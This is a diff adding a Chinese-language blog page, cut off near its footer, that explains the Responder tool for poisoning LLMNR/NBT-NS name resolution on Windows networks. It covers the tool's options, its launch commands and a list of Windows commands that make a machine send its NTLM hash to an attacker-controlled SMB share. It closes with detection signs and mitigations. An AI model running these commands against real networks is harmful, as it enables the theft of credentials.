@@ -1,0 +1,636 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/global/favicon.ico">
+  <link rel="icon" href="/img/global/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="eW1z4rd">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Responder 是一款强大并且简单易用的内网渗透神器，可以劫持 LLMNR 和 NBT-NS 请求。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Responder 内网渗透神器">
+<meta property="og:url" content="https://ew1z4rd.github.io/post/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/index.html">
+<meta property="og:site_name" content="栖丘">
+<meta property="og:description" content="Responder 是一款强大并且简单易用的内网渗透神器，可以劫持 LLMNR 和 NBT-NS 请求。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562575008600.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562576050781.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562659253546.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-02-02.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-12-06.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-10-38.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-16-34.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-16-49.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562835661260.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562835661261.png">
+<meta property="article:published_time" content="2019-07-24T14:52:15.000Z">
+<meta property="article:modified_time" content="2022-01-30T13:52:39.079Z">
+<meta property="article:author" content="eW1z4rd">
+<meta property="article:tag" content="OWASP">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="concept">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ew1z4rd.github.io/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562575008600.png">
+  
+  
+  <title>Responder 内网渗透神器 - 栖丘</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"ew1z4rd.github.io","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":"f307ed711fcf86fe5ceb149239b6cfc3","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>eW1z4rd&#39;s space</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/global/post-bg.webp') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Responder 内网渗透神器">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-07-24 22:52" pubdate>
+        2019年7月24日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      6.7k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      57 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Responder 内网渗透神器</h1>
+            
+            <div class="markdown-body">
+              <h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>Responder 是一款强大并且简单易用的内网渗透神器，可以劫持 LLMNR 和 NBT-NS 请求。</p>
+<p>工作原理是，在域名解析过程中，如果客户端/目标无法通过 DNS 进行域名解析，则会回退到 LLMNR 和 NBT-NS 协议下进行解析，在 Responder 运行的情况下，会对所有能收到的 LLMNR 和 NBT-NS 请求进行欺骗性响应，然后将所有的数据流导向到攻击者的机器。</p>
+<p><strong>下载地址：</strong></p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://github.com/SpiderLabs/Responder">LLMNR/NBT-NS/mDNS Poisoner</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder">LLMNR/NBT-NS/mDNS Poisoner and NTLMv1/2 Relay</a></li>
+</ol>
+<h2 id="0x01-功能特性"><a href="#0x01-功能特性" class="headerlink" title="0x01 功能特性"></a>0x01 功能特性</h2><ul>
+<li><p>内置 SMB 认证服务器</p>
+<p>默认支持带 NTLMSSP 安全扩展的 NTLMv1, NTLMv2 散列，已在 Windows 95 到 Windows Server 2012 RC, Samba 和 Mac OSX Lion 上成功测试。Windows NT4 支持明文密码，对于 Windows XP/2003 以及更早的版本，当设置 <code>--lm</code> 选项时，启用强制 LM 哈希降级。当工具启动时默认开启此功能，可以截获 Hash 进行 SMB 重放攻击（SMB Relay）。</p>
+</li>
+<li><p>内置 MSSQL 认证服务器</p>
+<p>对 Windows 版本高于 Windows Vista 的机器使用 <code>-r</code> 选项，以将 MSSQL 身份验证重定向到此工具（对于 Vista 和更高版本，Windows 将使用 LLMNR 协议）。该服务器支持 NTLMv1、LMv2 散列，已在 Windows SQL Server 2005 和 2008 上成功测试。</p>
+</li>
+<li><p>内置 HTTP 认证服务器</p>
+<p>对 Windows 版本高于 Windows Vista 的机器使用 <code>-r</code> 选项，以将 HTTP 身份验证重定向到此工具。该服务器支持 NTLMv1、NTLMv2 散列和基本身份验证，已在 IE 6 到 IE 10, Firefox, Chrome, Safari 上成功测试。</p>
+<blockquote>
+<p>注：此模块也适用于拦截 Windows WebDav 客户端（WebClient）发出的 WebDav NTLM 认证，可以向受害者发送任意文件。</p>
+</blockquote>
+</li>
+<li><p>内置 HTTPS 认证服务器</p>
+<p>对 Windows 版本高于 Windows Vista 的机器使用 <code>-r</code> 选项，以将 HTTPS 身份验证重定向到此工具。</p>
+<blockquote>
+<p><code>certs/</code> 目录下有两个默认的证书文件，目的是使 Responder 可以更容易使用，你也可以根据需要使用脚本生成自签名密钥对。</p>
+</blockquote>
+</li>
+<li><p>内置 LDAP 认证服务器</p>
+<p>对 Windows 版本高于 Windows Vista 的机器使用 <code>-r</code> 选项，以将 LDAP 身份验证重定向到此工具。该服务器已在 Windows支持工具 ldp 和 LdapAdmin 上成功测试。</p>
+</li>
+<li><p>内置 FTP, POP3, IMAP, SMTP 认证服务器</p>
+<p>用于收集明文凭证。</p>
+</li>
+<li><p>内置 DNS 服务器</p>
+<p>用于响应 A 类型的查询请求，结合 ARP 欺骗攻击将非常强大。</p>
+</li>
+<li><p>内置 WPAD 代理服务器</p>
+<p><strong>这个模块非常有效</strong>，此模块将捕获网络中其他用户所有的 HTTP 请求。您可以在 <code>Responder.conf</code> 中配置自定义的 PAC 脚本文件，并将 HTML 代码注入服务器的响应中，具体细节可以看 <code>Responder.conf</code>。</p>
+<p>该模块会抓取网络中的数据包,然后找到开启了Auto-detect settings的ie浏览器,然后向他注入PAC脚本具体可以看Responder.conf.</p>
+<blockquote>
+<p>注：需要用户在 IE 中启用了“自动检测设置”（Auto-detect settings）。</p>
+</blockquote>
+</li>
+<li><p>Browser Listener</p>
+<p>浏览器监听模块，该模块允许在隐身模式下找到 PDC。</p>
+<blockquote>
+<p>PDC：Primary Domain Controller（Microsoft Windows NT Server），主域控制器</p>
+</blockquote>
+</li>
+<li><p>Fingerprinting</p>
+<p>指纹识别模式，当使用 <code>-f</code> 选项时，Responder 会自动识别使用 LLMNR/NBT-NS 查询的主机指纹，所有捕获模块在指纹识别模式下仍然可以工作。</p>
+</li>
+<li><p>Icmp Redirect</p>
+<p>ICMP 重定向攻击（ICMP Redirects）模块，适用于 Windows XP/2003 和更早版本的域成员间进行 MITM 中间人攻击，结合 DNS 服务器模块使用会相当有效。</p>
+<blockquote>
+<p>使用 python tools/Icmp-Redirect.py</p>
+</blockquote>
+</li>
+<li><p>Rogue DHCP</p>
+<p>DHCP 欺骗攻击（DHCP Inform Spoofing）模块，允许你让真正的 DHCP 服务器响应 DHCPINFORM 请求，从而设置你的 IP 地址为主 DNS 服务器，并设置你自己的 WPAD 代理服务器。</p>
+<blockquote>
+<p>使用 python tools/DHCP.py</p>
+</blockquote>
+</li>
+<li><p>Analyze mode</p>
+<p>分析模式，在模式下允许你查看网络上的 NBT-NS、BROWSER、LLMNR、DNS 请求，而不会进行任何攻击行为。此外，您还可以被动地映射域、MSSQL 服务器和工作站的网络拓扑，并查看 ICMP 重定向攻击在子网上是否可行。</p>
+</li>
+</ul>
+<h2 id="0x02-选项参数"><a href="#0x02-选项参数" class="headerlink" title="0x02 选项参数"></a>0x02 选项参数</h2><blockquote>
+<p>在使用前请查看 <code>Response .conf</code> 并根据您的需要进行调整。</p>
+</blockquote>
+<p>使用样例：</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs reasonml">./<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Responder</span>.</span></span>py -I eth0 -wrf<br></code></pre></td></tr></table></figure>
+
+<p>选项：</p>
+<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs vhdl"><span class="hljs-comment">--version             show program&#x27;s version number and exit</span><br>-h, <span class="hljs-comment">--help            show this help message and exit</span><br>-A, <span class="hljs-comment">--analyze         Analyze mode. This option allows you to see NBT-NS,</span><br>                      BROWSER, LLMNR requests without responding.<br>-I eth0, <span class="hljs-comment">--interface=eth0</span><br>                      Network interface <span class="hljs-keyword">to</span> <span class="hljs-keyword">use</span>, you can <span class="hljs-keyword">use</span> <span class="hljs-symbol">&#x27;ALL</span>&#x27; as a<br>                      wildcard <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> interfaces<br>-i <span class="hljs-number">10.0</span>.<span class="hljs-number">0.21</span>, <span class="hljs-comment">--ip=10.0.0.21</span><br>                      Local IP <span class="hljs-keyword">to</span> <span class="hljs-keyword">use</span> (only <span class="hljs-keyword">for</span> OSX)<br>-e <span class="hljs-number">10.0</span>.<span class="hljs-number">0.22</span>, <span class="hljs-comment">--externalip=10.0.0.22</span><br>                      Poison <span class="hljs-keyword">all</span> requests <span class="hljs-keyword">with</span> another IP address than<br>                      Responder<span class="hljs-symbol">&#x27;s</span> one.<br>-b, <span class="hljs-comment">--basic           Return a Basic HTTP authentication. Default: NTLM</span><br>-r, <span class="hljs-comment">--wredir          Enable answers for netbios wredir suffix queries.</span><br>                      Answering <span class="hljs-keyword">to</span> wredir will likely break stuff <span class="hljs-keyword">on</span> the<br>                      network. <span class="hljs-keyword">Default</span>: <span class="hljs-literal">False</span><br>-d, <span class="hljs-comment">--NBTNSdomain     Enable answers for netbios domain suffix queries.</span><br>                      Answering <span class="hljs-keyword">to</span> domain suffixes will likely break stuff<br>                      <span class="hljs-keyword">on</span> the network. <span class="hljs-keyword">Default</span>: <span class="hljs-literal">False</span><br>-f, <span class="hljs-comment">--fingerprint     This option allows you to fingerprint a host that</span><br>                      issued an NBT-NS <span class="hljs-keyword">or</span> LLMNR query.<br>-w, <span class="hljs-comment">--wpad            Start the WPAD rogue proxy server. Default value is</span><br>                      <span class="hljs-literal">False</span><br>-u UPSTREAM_PROXY, <span class="hljs-comment">--upstream-proxy=UPSTREAM_PROXY</span><br>                      Upstream HTTP proxy used by the rogue WPAD Proxy <span class="hljs-keyword">for</span><br>                      outgoing requests (format: host:<span class="hljs-keyword">port</span>)<br>-F, <span class="hljs-comment">--ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file</span><br>                      retrieval. This may cause a login prompt. <span class="hljs-keyword">Default</span>:<br>                      <span class="hljs-literal">False</span><br>-P, <span class="hljs-comment">--ProxyAuth       Force NTLM (transparently)/Basic (prompt)</span><br>                      authentication <span class="hljs-keyword">for</span> the proxy. WPAD doesn<span class="hljs-symbol">&#x27;t</span> need <span class="hljs-keyword">to</span> be<br>                      <span class="hljs-keyword">ON</span>. This option <span class="hljs-keyword">is</span> highly effective <span class="hljs-keyword">when</span> combined <span class="hljs-keyword">with</span><br>                      -r. <span class="hljs-keyword">Default</span>: <span class="hljs-literal">False</span><br><span class="hljs-comment">--lm                  Force LM hashing downgrade for Windows XP/2003 and</span><br>                      earlier. <span class="hljs-keyword">Default</span>: <span class="hljs-literal">False</span><br>-v, <span class="hljs-comment">--verbose         Increase verbosity.</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="0x03-使用示例"><a href="#0x03-使用示例" class="headerlink" title="0x03 使用示例"></a>0x03 使用示例</h2><ul>
+<li><p><strong>针对特定主机</strong></p>
+<p>如果你想针对特定的 IP / IP范围，可以通过修改 <code>Responder.conf</code> 并更改 <strong>RespondTo</strong> 参数。当你只是想针对特定的目标时，这是非常有用的，因为你不希望导致整个网络的中断。此外，还可以通过改变 RespondToName 参数来指定 NBT-NS/LLMNR 名称。下图中，我们就是针对主机 192.168.253.130 进行的特定攻击。</p>
+<p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562575008600.png" srcset="/img/loading.gif" lazyload alt="修改 Responder.conf 文件更改 RespondTo 参数 "></p>
+</li>
+<li><p><strong>分析模式</strong></p>
+<blockquote>
+<p>使用 ./Responder.py -I eth0 -A 命令启用分析模式</p>
+</blockquote>
+<p>在 <code>-A</code> 分析模式下时，Responder 会被动监听网络中的事件，但不主动响应任何请求，如图所示：</p>
+<p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562576050781.png" srcset="/img/loading.gif" lazyload alt="启动 Responder 分析模式 "></p>
+</li>
+<li><p><strong>WPAD 攻击</strong></p>
+<blockquote>
+<p>使用 <strong>./Responder.py -I eth0 wrf</strong> 命令启动 WPAD 攻击</p>
+</blockquote>
+<p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562659253546.png" srcset="/img/loading.gif" lazyload alt="启动 Responder WPAD 攻击模式 "></p>
+<p>对于 SMB 协议，客户端在连接服务端时，默认先使用本机的用户名和密码 Hash 尝试登录，因此可以模拟 SMB 服务器从而截获 Hash，执行如下命令都可以在攻击机得到 Hash：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs shell">net.exe use \\host\share<br>attrib.exe \\host\share<br>bcdboot.exe \\host\share<br>bdeunlock.exe \\host\share<br>cacls.exe \\host\share<br>certreq.exe \\host\share #(noisy, pops an error dialog)<br>certutil.exe \\host\share<br>cipher.exe \\host\share<br>ClipUp.exe -l \\host\share<br>cmdl32.exe \\host\share<br>cmstp.exe /s \\host\share<br>colorcpl.exe \\host\share #(noisy, pops an error dialog)<br>comp.exe /N=0 \\host\share \\host\share<br>compact.exe \\host\share<br>control.exe \\host\share<br>convertvhd.exe -source \\host\share -destination \\host\share<br>Defrag.exe \\host\share<br>DeployUtil.exe /install \\host\share<br>DevToolsLauncher.exe GetFileListing \\host\share #(this one&#x27;s cool. will return a file listing (json-formatted) from remote SMB share...)<br>diskperf.exe \\host\share<br>dispdiag.exe -out \\host\share<br>doskey.exe /MACROFILE=\\host\share<br>esentutl.exe /k \\host\share<br>expand.exe \\host\share<br>extrac32.exe \\host\share<br>FileHistory.exe \\host\share #(noisy, pops a gui)<br>findstr.exe * \\host\share<br>fontview.exe \\host\share #(noisy, pops an error dialog)<br>fvenotify.exe \\host\share #(noisy, pops an access denied error)<br>FXSCOVER.exe \\host\share #(noisy, pops GUI)<br>hwrcomp.exe -check \\host\share<br>hwrreg.exe \\host\share<br>icacls.exe \\host\share<br>LaunchWinApp.exe \\host\share #(noisy, will pop an explorer window with the  contents of your SMB share.)<br>licensingdiag.exe -cab \\host\share<br>lodctr.exe \\host\share<br>lpksetup.exe /p \\host\share /s<br>makecab.exe \\host\share<br>MdmDiagnosticsTool.exe -out \\host\share #(sends hash, and as a *bonus!* writes an MDMDiagReport.html to the attacker share with full CSP configuration.)<br>mshta.exe \\host\share #(noisy, pops an HTA window)<br>msiexec.exe /update \\host\share /quiet<br>msinfo32.exe \\host\share #(noisy, pops a &quot;cannot open&quot; dialog)<br>mspaint.exe \\host\share #(noisy, invalid path to png error)<br>mspaint.exe \\host\share\share.png #(will capture hash, and display the remote PNG file to the user)<br>msra.exe /openfile \\host\share #(noisy, error)<br>mstsc.exe \\host\share #(noisy, error)<br>netcfg.exe -l \\host\share -c p -i foo<br></code></pre></td></tr></table></figure>
+
+<p><strong>攻击流量情况：</strong></p>
+</li>
+</ul>
+<p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-02-02.png" srcset="/img/loading.gif" lazyload alt="向受害者发送 NBNS 欺骗响应"></p>
+<p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-12-06.png" srcset="/img/loading.gif" lazyload alt="向受害者发送 LLMNR 欺骗响应"></p>
+<p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-10-38.png" srcset="/img/loading.gif" lazyload alt="重定向身份认证过程中 SMB 传输的用户名和 HASH 值 "></p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><h3 id="特征流量检测"><a href="#特征流量检测" class="headerlink" title="特征流量检测"></a>特征流量检测</h3><ul>
+<li><p>特征行为检测</p>
+<p>程序在启动时会连续发送两个完全相同的 IGMPv3 数据包，请求同时加入 224.0.0.251 和 224.0.0.252 组播组，同样程序在退出时，也会发送两个相同的 IGMPv3 数据包，请求离开上述的组播组，如下图所示：</p>
+<p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-16-34.png" srcset="/img/loading.gif" lazyload alt="Responder 工具 WPAD 攻击启动时行为"></p>
+<p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-16-49.png" srcset="/img/loading.gif" lazyload alt="Responder 工具 WPAD 攻击退出时行为 "></p>
+</li>
+<li><p>特殊协议捕获</p>
+<p>对整个过程中使用的特殊协议进行捕获（主要为 SMB、LLMNR、NBNS、MDNS、IGMPv3、BROWSER），如果多个上述协议中的数据流量同时指向一个主机，则怀疑有可能受到攻击。</p>
+</li>
+<li><p>特征端口检测</p>
+<p>该工具监听以下端口：UDP 137, UDP 138, UDP 53, UDP/TCP 389, TCP 1433, TCP 80, TCP 139, TCP 445, TCP 21, TCP 3141, TCP 25, TCP 110, TCP 587 和 多播 UDP 5553。</p>
+<p>对这些特殊端口的流量要格外注意，并加强分析。</p>
+</li>
+<li><p>敏感内容检测</p>
+<p>重点关注 SMB 数据包中所返回的明文内容，其包含用户在 NTML 验证过程中所使用的 Username、hash 值等，对敏感字符做特征匹配。</p>
+</li>
+</ul>
+<h3 id="预防和修复"><a href="#预防和修复" class="headerlink" title="预防和修复"></a>预防和修复</h3><p>为了加强 Windows 系统的安全性，可以进行以下调整。</p>
+<ul>
+<li><p>通过组策略禁用 LLMNR</p>
+<p>打开 gpedit.msc 到计算机配置 &gt; 管理 &gt; 网络 &gt; DNS 客户端 &gt; 关闭多播域名解析，并设置为已启用：</p>
+<p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562835661260.png" srcset="/img/loading.gif" lazyload alt="关闭多播域名解析"></p>
+</li>
+<li><p>禁用 NetBIOS</p>
+<p>这可以到以太网 &gt; 属性 &gt; IPv4 &gt; 属性 &gt; 高级 &gt; WINS，然后在“NetBIOS设置”下选择禁用 TCP/IP 上的 NetBIOS：</p>
+<p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562835661261.png" srcset="/img/loading.gif" lazyload alt="禁用 TCP/IP 上的 NetBIOS "></p>
+<blockquote>
+<p>或者通过到注册表修改下面的键，并将值更改为2 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces{$ InterfaceID}\NetbiosOptions</p>
+</blockquote>
+</li>
+<li><p>通过组策略启用 SMB 签名</p>
+<p>SMB签名的更多细节以及可以定义的各种值可以在以下链接中找到：<br><a target="_blank" rel="noopener" href="http://techgenix.com/secure-smb-connections/">http://techgenix.com/secure-smb-connections/</a><br><a target="_blank" rel="noopener" href="https://technet.microsoft.com/en-us/library/jj852239(v=ws.11).aspx">https://technet.microsoft.com/en-us/library/jj852239(v=ws.11).aspx</a></p>
+</li>
+</ul>
+<h2 id="0x05-参考文章"><a href="#0x05-参考文章" class="headerlink" title="0x05 参考文章"></a>0x05 参考文章</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/SpiderLabs/Responder/blob/master/README.md">SpiderLabs/Responder - README.md</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/responder-20-owning-windows-networks-part-3/">Responder 2.0 - Owning Windows Networks part 3</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/65503.html">渗透师指南之Responder</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/1b545a8b8b1e">内网渗透之Responder与Net-NTML hash</a></li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+                    
